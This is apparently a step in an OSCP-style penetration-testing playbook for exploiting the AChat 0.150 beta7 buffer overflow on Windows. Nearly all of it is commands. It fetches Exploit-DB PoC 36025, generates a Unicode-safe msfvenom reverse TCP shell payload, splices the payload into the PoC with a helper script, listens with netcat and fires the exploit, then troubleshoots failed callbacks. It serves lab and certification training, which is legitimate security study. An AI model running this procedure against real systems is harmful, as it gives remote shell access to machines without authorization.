# Windows - Remote - AChat Buffer Overflow

**Step 26A of 50 · Windows**

*Exploit AChat 0.150 beta7 with the standalone Exploit-DB proof of concept.*

## Run this

```bash
searchsploit achat
searchsploit -x 36025
searchsploit -m 36025
```

Generate x86 Unicode-safe shellcode. BufferRegister=EAX tells the decoder where the encoded buffer begins. Pipe straight into buf_swap.py to replace the buf block and fix the target IP in one step.

```bash
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp \
  LHOST=$LocalIP LPORT=$ListenPort \
  -e x86/unicode_mixed BufferRegister=EAX -f python \
  | python3 ~/Documents/Obsidian/main-vault/OSCP/TOOLS/buf_swap.py $BoxDir/36025.py $BoxIP
```

Verify Python 2 syntax before running:

```bash
python2 -m py_compile $BoxDir/36025.py
```

Catch the callback and run the PoC:

```bash
nc -lvnp $ListenPort
cd $BoxDir && python2 36025.py
```

## What did you get?

- [ ] A shell connects back → **Go to Step 27 · [[Windows - Shell Received]]**
- [ ] The PoC prints its success marker but no callback → **Check $LocalIP, $ListenPort, UDP $ExploitPort, and the EAX encoder setting**
- [ ] Python errors → **Keep the original Python 2 packet sender and check the payload replacement**
- [ ] The service is no longer reachable → **Reset the box and retry once**

## Notes

AChat expects the overflow on UDP port $ExploitPort. The original PoC sends one large packet and exits. Do not replace its packet construction with a custom sender.

`buf_swap.py` at `OSCP/TOOLS/buf_swap.py` works on any Python 2 EDB PoC with a `buf` variable -- not just AChat. It handles all common buf formats (`""`, `b""`, one or two spaces) and uses a lambda replacement to avoid Python's `re.sub` treating `\x` bytes as backreferences.

## Gotcha

> [!warning] 💡
> BufferRegister=EAX is required. Without it, the payload can reach the target but fail during self-decoding.

## External Resources

- [Exploit-DB 36025](https://www.exploit-db.com/exploits/36025)
- [PayloadsAllTheThings: Shellcode and Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Shellcode%20and%20Injection)

